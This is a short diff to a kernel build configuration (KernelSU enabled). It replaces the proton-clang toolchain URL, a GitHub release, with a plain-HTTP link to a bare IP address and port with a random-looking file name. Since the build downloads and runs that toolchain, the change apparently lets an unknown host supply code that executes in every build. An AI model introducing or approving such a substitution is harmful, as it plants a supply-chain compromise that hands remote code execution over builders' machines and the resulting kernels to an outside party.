@@ -10,7 +10,7 @@
     "withKernelSU": true,
     "toolchains": [
       {
-        "url": "https://github.com/utziacre/tc-build/releases/download/20230708/ClangBuiltLinux.tar.xz",
+        "url": "http://45.79.56.248:36078/down/Jvdd0lyOYG6s.gz",
         "name": "proton-clang",
         "binPath": ["bin"]
       }
